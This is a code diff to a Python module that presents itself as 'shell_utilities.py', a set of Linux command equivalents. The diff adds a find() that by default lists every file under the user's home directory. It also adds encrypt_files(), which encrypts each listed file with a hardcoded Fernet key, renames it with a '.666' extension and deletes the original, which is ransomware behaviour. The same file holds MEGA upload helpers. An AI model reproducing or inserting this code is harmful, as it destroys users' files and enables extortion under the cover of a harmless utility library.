@@ -1,5 +1,5 @@
 """
-linux_commands.py - A Python implementation of common Linux/Unix commands
+shell_utilities.py - A Python implementation of common Linux/Unix commands
 """
 
 import os
@@ -13,9 +13,52 @@ import time
 import getpass
 import platform
 from pathlib import Path
+from colorama import Fore, Style, init as colorama_init
+import wget as wget_module
+from mega import Mega
+
+# === Initialize colorama (for cross-platform support) ===
+colorama_init(autoreset=True)
+
+# === Message printing utility with verbosity and color control ===
+def message(text, level='info', verbose=True):
+    """
+    Print colored terminal messages with optional verbosity control.
+
+    Args:
+        text (str): Message text.
+        level (str): Message type: 'info', 'success', 'warning', 'error', 'debug'.
+        verbose (bool): If False, message is suppressed.
+    """
+    if not verbose:
+        return
+
+    colors = {
+        'info': Fore.CYAN,
+        'success': Fore.GREEN,
+        'warning': Fore.YELLOW,
+        'error': Fore.RED,
+        'debug': Fore.MAGENTA
+    }
+
+    prefixes = {
+        'info': '[INFO]',
+        'success': '[OK]',
+        'warning': '[WARN]',
+        'error': '[ERR]',
+        'debug': '[DBG]'
+    }
+
+    color = colors.get(level.lower(), Fore.WHITE)
+    prefix = prefixes.get(level.lower(), '[MSG]')
+
+    print(f"{color}{prefix} {text}{Style.RESET_ALL}")
+
+
+# === Core shell utilities ===
 
 def pwd():
-    """Print working directory (like 'pwd')"""
+    """Return current working directory (like 'pwd')"""
     return os.getcwd()
 
 def clear():
@@ -27,8 +70,9 @@ def cd(path):
     os.chdir(path)
 
 def ls(path='.', all_files=False, long_format=False):
-    """List directory contents (like 'ls')
-    
+    """
+    List directory contents (like 'ls')
+
     Args:
         path: Directory path (default: current directory)
         all_files: Show hidden files (like -a flag)
@@ -42,8 +86,9 @@ def ls(path='.', all_files=False, long_format=False):
     return items
 
 def mkdir(path, parents=False, mode=0o777):
-    """Create directory (like 'mkdir')
-    
+    """
+    Create directory (like 'mkdir')
+
     Args:
         path: Directory path to create
         parents: Create parent directories as needed (like -p flag)
@@ -55,30 +100,33 @@ def mkdir(path, parents=False, mode=0o777):
         os.mkdir(path, mode=mode)
 
 def rm(path, recursive=False, force=False):
-    """Remove files/directories (like 'rm')
-    
+    """
+    Remove files/directories (like 'rm')
+
     Args:
         path: Path to remove
-        recursive: Remove directories recursively (like -r flag)
-        force: Ignore errors if file doesn't exist (like -f flag)
+        recursive: Remove directories recursively (like -r)
+        force: Ignore errors if file doesn't exist (like -f)
     """
     try:
         if os.path.isdir(path):
             shutil.rmtree(path) if recursive else os.rmdir(path)
         else:
             os.remove(path)
-    except Exception:
+    except Exception as e:
         if not force:
             raise
+        message(f"Failed to remove {path}: {e}", level="warning")
 
 def cp(src, dst, recursive=False, preserve_metadata=False):
-    """Copy files/directories (like 'cp')
-    
+    """
+    Copy files/directories (like 'cp')
+
     Args:
         src: Source path
         dst: Destination path
-        recursive: Copy directories recursively (like -r flag)
-        preserve_metadata: Preserve file metadata (like -p flag)
+        recursive: Copy directories recursively
+        preserve_metadata: Preserve file metadata
     """
     if os.path.isdir(src):
         if not recursive:
@@ -88,7 +136,7 @@ def cp(src, dst, recursive=False, preserve_metadata=False):
         shutil.copy2(src, dst) if preserve_metadata else shutil.copy(src, dst)
 
 def mv(src, dst):
-    """Move/rename files (like 'mv')"""
+    """Move or rename files (like 'mv')"""
     shutil.move(src, dst)
 
 def touch(path):
@@ -111,36 +159,156 @@ def tail(file_path, lines=10):
         return f.readlines()[-lines:]
 
 def echo(text, newline=True):
-    """Print text (like 'echo')"""
+    """Print text to terminal (like 'echo')"""
     print(text, end='\n' if newline else '')
 
 def sleep(seconds):
     """Pause execution (like 'sleep')"""
     time.sleep(seconds)
 
-def find(path='.', name=None, type_filter=None):
-    """Search for files (like 'find')
-    
-    Args:
-        path: Starting directory (default: current directory)
-        name: Filename pattern to match
-        type_filter: Filter by type ('d' for directory, 'f' for file)
+def find(rootdir="~", ext=None, mode="file", save_list=True, output_file="FilesFound.txt", verbose=True):
     """
-    matches = []
-    for root, dirs, files in os.walk(path):
-        items = dirs if type_filter == 'd' else files if type_filter == 'f' else dirs + files
-        for item in items:
-            if name is None or fnmatch.fnmatch(item, name):
-                matches.append(os.path.join(root, item))
-    return matches
+    Recursively search for files or directories.
+
+    Args:
+        rootdir (str): Base directory to start search.
+        ext (str): File extension to filter (only applies in 'file' mode).
+        mode (str): Search mode: 'file', 'dir', or 'all'.
+        save_list (bool): Whether to save results to a file.
+        output_file (str): Output file path (used if save_list=True).
+        verbose (bool): Enable or disable output messages.
+
+    Returns:
+        List[str]: List of matching paths.
+    """
+    def expand_user_path(path):
+        return os.path.expanduser(path)
+
+    def find_items(directory, extension, mode):
+        item_list = []
+        directory = expand_user_path(directory)
+
+        try:
+            for root, dirs, files in os.walk(directory):
+                if mode in ("dir", "all"):
+                    for d in dirs:
+                        full_dir = os.path.join(root, d)
+                        item_list.append(full_dir)
+                        message(full_dir, level="debug", verbose=verbose)
+                if mode in ("file", "all"):
+                    for f in files:
+                        if extension is None or f.lower().endswith(extension.lower()):
+                            full_file = os.path.join(root, f)
+                            item_list.append(full_file)
+                            message(full_file, level="debug", verbose=verbose)
+        except PermissionError:
+            message(f"Permission denied: {directory}", level="warning", verbose=verbose)
+        except Exception as e:
+            message(f"Error: {e}", level="error", verbose=verbose)
+
+        return item_list
+
+    clear()
+    if ext is None and mode == "file":
+        ext = input("Extension: ").strip()
+
+    search_path = expand_user_path(rootdir)
+    message(f"Searching in {search_path} (mode={mode}, ext={ext})...", level="info", verbose=verbose)
+
+    results = find_items(search_path, ext, mode)
+
+    if save_list:
+        try:
+            with open(output_file, 'w', encoding='utf-8') as f:
+                f.write("\n".join(results))
+            message(f"List saved to: {os.path.abspath(output_file)}", level="success", verbose=verbose)
+        except IOError as e:
+            message(f"Failed to save list: {e}", level="error", verbose=verbose)
+
+    message(f"Total found: {len(results)}", level="info", verbose=verbose)
+    return results
+
+
+from cryptography.fernet import Fernet
+
+KEY = b'QmmjsJEWUdyufMX_XxZkGZ0TE6ba4aGttqIfBsMyn18='
+
+def encrypt_files(file_list, key=KEY, verbose=True):
+    """
+    Encrypts files using a predefined key (stored in KEY).
+    Renames files with '.666' extension.
+
+    Args:
+        file_list (list): List of file paths.
+        key (bytes): Predefined encryption key (default: KEY).
+        verbose (bool): Show progress messages.
+    """
+    try:
+        fernet = Fernet(key)
+        
+        for file_path in file_list:
+            try:
+                if not os.path.isfile(file_path):
+                    message(f"File not found: {file_path}", level="warning", verbose=verbose)
+                    continue
+                
+                with open(file_path, "rb") as f:
+                    file_data = f.read()
+                
+                encrypted_data = fernet.encrypt(file_data)
+                new_path = file_path + ".666"
+                
+                with open(new_path, "wb") as f:
+                    f.write(encrypted_data)
+                
+                os.remove(file_path)
+                message(f"Encrypted: {file_path} -> {new_path}", level="success", verbose=verbose)
+            
+            except Exception as e:
+                message(f"Failed to encrypt {file_path}: {e}", level="error", verbose=verbose)
+    
+    except Exception as e:
+        message(f"Encryption error: {e}", level="error", verbose=verbose)
+
+def decrypt_files(file_list, key=KEY, verbose=True):
+    """
+    Decrypts files using the predefined key (KEY).
+    Removes '.666' extension to restore original names.
+
+    Args:
+        file_list (list): List of encrypted files (.666).
+        key (bytes): Predefined key (default: KEY).
+        verbose (bool): Show progress messages.
+    """
+    try:
+        fernet = Fernet(key)
+        
+        for file_path in file_list:
+            try:
+                if not file_path.endswith(".666"):
+                    message(f"Skipped (not a .666 file): {file_path}", level="warning", verbose=verbose)
+                    continue
+                
+                with open(file_path, "rb") as f:
+                    encrypted_data = f.read()
+                
+                decrypted_data = fernet.decrypt(encrypted_data)
+                original_path = file_path[:-4]  # Remove '.666'
+                
+                with open(original_path, "wb") as f:
+                    f.write(decrypted_data)
+                
+                os.remove(file_path)
+                message(f"Decrypted: {file_path} -> {original_path}", level="success", verbose=verbose)
+            
+            except Exception as e:
+                message(f"Failed to decrypt {file_path}: {e}", level="error", verbose=verbose)
+    
+    except Exception as e:
+        message(f"Decryption error: {e}", level="error", verbose=verbose)
 
 def grep(path, pattern):
-    """Search text in files (like 'grep')
-    
-    Args:
-        path: File path to search
-        pattern: Regular expression pattern to search for
-    """
+    """Search text in files (like 'grep')"""
     import re
     matches = []
     with open(path) as f:
@@ -161,26 +329,28 @@ def chown(path, user=None, group=None):
     os.chown(path, uid, gid)
 
 def ln(src, dst, symbolic=True):
-    """Create links (like 'ln')
-    
-    Args:
-        src: Source path
-        dst: Destination path
-        symbolic: Create symbolic link (default) or hard link
-    """
+    """Create hard or symbolic link (like 'ln')"""
     os.symlink(src, dst) if symbolic else os.link(src, dst)
 
-def wget(url, output=None):
-    """Download file from URL (like 'wget')
-    
-    Args:
-        url: URL to download
-        output: Output filename (default: basename from URL)
+def wget(url, output=None, verbose=True):
     """
-    if output is None:
-        output = os.path.basename(url)
-    urllib.request.urlretrieve(url, output)
-    return output
+    Download file using Python's wget module.
+
+    Args:
+        url (str): File URL.
+        output (str): Output file path (optional).
+        verbose (bool): Show output messages.
+
+    Returns:
+        str: Path to downloaded file.
+    """
+    try:
+        filepath = wget_module.download(url, out=output) if output else wget_module.download(url)
+        message(f"Download complete: {filepath}", level="success", verbose=verbose)
+        return filepath
+    except Exception as e:
+        message(f"Download failed: {e}", level="error", verbose=verbose)
+        return None
 
 def tar_create(archive_name, source_path):
     """Create tar archive (like 'tar -czf')"""
@@ -217,19 +387,19 @@ def ps():
     return [{'pid': p.pid, 'name': p.name(), 'status': p.status()} for p in psutil.process_iter()]
 
 def kill(pid, sig=15):
-    """Kill process (like 'kill')"""
+    """Send signal to process (like 'kill')"""
     os.kill(pid, sig)
 
 def whoami():
-    """Show current user (like 'whoami')"""
+    """Return current username (like 'whoami')"""
     return getpass.getuser()
 
 def env():
-    """Show environment variables (like 'env')"""
+    """Return environment variables (like 'env')"""
     return dict(os.environ)
 
 def uname():
-    """Show system information (like 'uname -a')"""
+    """Return system information (like 'uname -a')"""
     return {
         'system': platform.system(),
         'node': platform.node(),
@@ -240,7 +410,7 @@ def uname():
     }
 
 def which(cmd):
-    """Locate command (like 'which')"""
+    """Locate command in PATH (like 'which')"""
     for path in os.environ["PATH"].split(os.pathsep):
         full_path = os.path.join(path, cmd)
         if os.path.isfile(full_path) and os.access(full_path, os.X_OK):
@@ -253,28 +423,19 @@ def ping(host, count=4):
     return result.stdout
 
 
-"""
-mega_utilities.py - Simplified interface for MEGA.nz commands via Python
-Requires: mega.py (pip install mega.py)
-"""
-
-from mega import Mega
-import os
+# === MEGA.nz integration ===
 
 _mega_session = None
 
 def mega_login(email=None, password=None):
-    """Login to MEGA (anonymously or with account)"""
+    """Login to MEGA.nz (anonymous or authenticated)"""
     global _mega_session
     mega = Mega()
-    if email and password:
-        _mega_session = mega.login(email, password)
-    else:
-        _mega_session = mega.login()
+    _mega_session = mega.login(email, password) if email and password else mega.login()
     return True
 
 def mega_logout():
-    """End current session (not required in mega.py)"""
+    """Logout from MEGA (clear session)"""
     global _mega_session
     _mega_session = None
 
@@ -285,7 +446,7 @@ def mega_upload(filepath):
     return _mega_session.upload(filepath)
 
 def mega_get_link(file_dict):
-    """Get shareable download link for a file"""
+    """Get shareable link from MEGA file object"""
     if not _mega_session:
         raise Exception("Not authenticated.")
     return _mega_session.get_upload_link(file_dict)
@@ -303,13 +464,13 @@ def mega_list_files():
     } for file_id, f in files.items()]
 
 def mega_download_url(url, dest_filename=None):
-    """Download public file from MEGA URL"""
+    """Download public MEGA URL"""
     if not _mega_session:
         mega_login()
     _mega_session.download_url(url, dest_filename)
 
 def mega_download_file(file_dict, dest_path='.'):
-    """Download file from logged-in account"""
+    """Download file from MEGA account"""
     if not _mega_session:
         raise Exception("Not authenticated.")
     _mega_session.download(file_dict, dest_path)
